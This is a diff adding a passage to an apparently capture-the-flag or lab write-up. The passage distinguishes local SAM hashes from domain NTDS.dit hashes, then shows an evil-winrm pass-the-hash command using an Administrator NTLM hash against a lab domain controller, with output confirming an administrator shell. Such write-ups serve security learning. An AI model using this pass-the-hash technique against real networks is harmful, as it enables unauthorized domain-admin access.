@@ -503,3 +503,17 @@ There are two administrator hashes one is from NTDS.dit and the other is from SA
 
 SAM holds local user hashes NTDS holds domain wide credentials so in this context the administrator thats from SAM is a local admin hash and the other from NTDS is a domain admin hash!
 
+```python
+evil-winrm -i dc.ext.darkhaven.local -u Administrator -H 'c093cbd6000fa289a92b412131a4cefa'  
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+darkhaven\administrator
+```
+After using the domain admin hash i get access
